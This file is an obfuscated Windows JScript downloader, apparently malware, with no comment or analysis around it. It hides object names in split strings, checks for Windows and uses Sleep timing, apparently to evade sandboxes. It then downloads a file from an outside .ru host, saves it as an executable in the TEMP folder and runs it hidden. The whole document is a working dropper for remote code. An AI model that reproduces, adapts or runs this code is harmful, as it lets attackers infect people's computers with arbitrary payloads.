var FT = false;
var AN = "Create"+"Object";
var A2 = function A() {return WScript[AN]("WScript"+".Shell");}(), H0 = 11;
var XX = "MSXML2"+".XMLHTTP";
var BF = 2;
var RU = BF - 2;
function ZS(QP){A2["Run"](QP, RU, RU);};
function V(){return XX + "";};
function C(EF, K1){RU = RU * 1; return EF - K1;};
function GY(){return AN;};
/*@cc_on
  @if (@_win32 || @_win64)
    FT = true;
  @end
@*/
if (FT)
{
var H = "";
function XH(){return 22;};
var S = 0; var A1 = 0;
function UF()
{
var W = new this["Date"]();
var A0 = W["getUTCMilliseconds"]();
WScript["Sleep"](XH());
var W = new this["Date"]();
var PO = W["getUTCMilliseconds"]();
WScript["Sleep"](XH());
var W = new this["Date"]();
var BQ = W["getUTCMilliseconds"]();
var S = "KP";
S = C(PO, A0);
var A1 = "WO";
A1 = C(BQ, PO);
H = "open";
return C(S, A1);
}
var X = false;
var FZ = false;
for (var EB = RU; EB < XH() * 1; EB++){if (UF() != RU){
X = true; 
A1 = "31" + 11 * S + A1; 
FZ = true; 
break;
}}
function K() {return ((X == true) && (X == FZ)) ? 1 : RU;};
if (X && K() && FZ){
function EZ() {return A2["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "zbvm4kuJB.ex" + "e";};
 WH = V();
 K0 = WScript[AN](WH);
 var AM = 1;
do { 
	for (;AM;){
	try {
		if (AM == 1)
		{
			K0[H]("GET", "http://brand-obuv.ru/m3isud", false);
			K0["send"]();
			Z = "Sleep";
			AM = 2;
		}
		WScript[Z](XH() + 120); 
		if (K0["readystate"] < 2 * 2) continue;
		AM = RU;
		function VK(ZH) {var KJ = (1, 2, 3, 4, 5, ZH); return KJ;};
		KZ = WScript[GY()]("ADODB.Stream");
		WH = KZ;
		WH[H]();
		WH["type"] = VK(1);
		WH["write"](K0["ResponseBody"]);
		KZ["position"] = VK(RU);
		WH["Save" + "ToFile"](EZ(), 2);
		KZ["cl"+"ose"]();
		U = EZ();
		ZS(U);
	} catch(D){};};
}while (AM);
}
}

